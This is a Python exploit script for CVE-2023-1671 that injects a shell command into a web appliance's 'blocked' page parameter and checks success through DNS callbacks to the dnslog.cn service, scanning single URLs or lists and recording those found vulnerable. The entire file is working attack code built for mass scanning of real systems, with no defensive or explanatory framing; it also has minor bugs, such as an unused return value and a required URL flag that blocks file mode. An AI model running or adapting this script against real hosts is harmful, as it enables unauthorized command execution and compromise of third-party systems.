import argparse
import time
import requests
import base64

def dnslog_getdomain(session):
    url = 'http://www.dnslog.cn/getdomain.php?t=0'
    try:
        res = session.get(url, verify=False, timeout=60)
        return res.text
    except:
        print(f"[x] {url} --> DNSlog platform --> Request error.")

def dnslog_getrecords(session, target_url, domain, count):
    url = 'http://www.dnslog.cn/getrecords.php?t=0'
    try:
        resp = session.get(url, verify=False, timeout=60)
        if domain in resp.text:
            if count == 0:
                print(f"[++++++] {target_url} --> vulnerable!")
                with open("CVE-2023-1671-vulnerable-urls.txt", 'a+', encoding="utf-8") as f:
                    f.write(target_url + "\n")
            else:
                print(f"[++++++] {target_url} --> vulnerable!")
                with open("CVE-2023-1671-vulnerable-urls.txt", 'a+', encoding="utf-8") as f:
                    f.write(target_url + "\n")
        else:
            print(f"[x] {target_url} --> unvulnerable.")
    except:
        print(f"[x] {target_url} --> Request error.")

def exploit(target_url, domain, session):
    try:
        url = f"{target_url}/index.php?c=blocked&action=continue"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "curl/8.0.1"
        }
        user_encoded = base64.b64encode(f"';ping {domain} -c 3 #".encode()).decode().replace("=", "")
        data = f"args_reason=filetypewarn&url=16625&filetype=5831&user=4525&user_encoded={user_encoded}"
        session.post(url, data=data, headers=headers, verify=False, timeout=60)
    except requests.exceptions.ProxyError:
        print(f"[x] {target_url} --> Proxy error.")
    except Exception as e:
        print(f"[x] {target_url} --> Unknown error.Error message: {e}")

def main(target_url, dnslog_url, file):
    session = requests.session()
    count = 0
    if target_url and dnslog_url:
        status_code = exploit(target_url, dnslog_url, session)
        if status_code == 200:
            print(f'[+] {target_url} --> The response value is {status_code}, please check the dnslog information by your')
    elif target_url:
        session = requests.session()
        domain = dnslog_getdomain(session)
        exploit(target_url, domain, session)
        dnslog_getrecords(session, target_url, domain, count)
    elif file:
        for url in file:
            count += 1
            target_url = url.replace('\n', '')
            session = requests.session()
            domain = dnslog_getdomain(session)
            time.sleep(1)
            exploit(target_url, domain, session)
            dnslog_getrecords(session, target_url, domain, count)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Exploit script')
    parser.add_argument('-u', '--url', type=str, required=True, help='Target URL, like: http://wwww.example.com')
    parser.add_argument('-d', '--dnslog', type=str, required=False, help='DNSLog platform address')
    parser.add_argument('-f', '--file', type=str, required=False, help='Target file')
    args = parser.parse_args()
    main(args.url, args.dnslog, args.file)